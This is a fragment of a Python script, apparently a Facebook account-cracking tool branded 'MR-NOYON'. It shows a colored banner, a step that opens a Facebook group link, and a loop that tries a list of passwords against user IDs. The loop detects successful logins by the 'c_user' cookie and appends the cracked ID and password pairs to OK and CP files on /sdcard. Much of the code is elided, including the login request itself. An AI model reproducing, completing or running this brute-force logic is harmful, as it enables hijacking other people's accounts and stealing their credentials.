...
\033[1;32m
\033[1;32m[+]     Owner    : MR-NOYON
\033[1;32m[+]     Facebook : DJ-JAMAI 
\033[1;32m[+]     Version  : 1.0
\033[1;32m[+]     GitHub   : HAMIDUL143
...
try:
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m JOIN MY PUBLIC GROUP..!')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Loading To Next...')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m WELCOME MR-NOYON TOOLS..!')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('xdg-open https://facebook.com/groups/689113179420263/')
    else:pass
...
def news():
    ...
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in MR-NOYON/ok.txt,MR-NOYON/cp.txt')
    print('\033[1;31m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MR-NOYON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[65:80]
                print('[CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/MR-NOYON-CP.txt', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \x1b[38;5;196m[\x1b[38;5;46mMR-NOYON\x1b[38;5;196m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
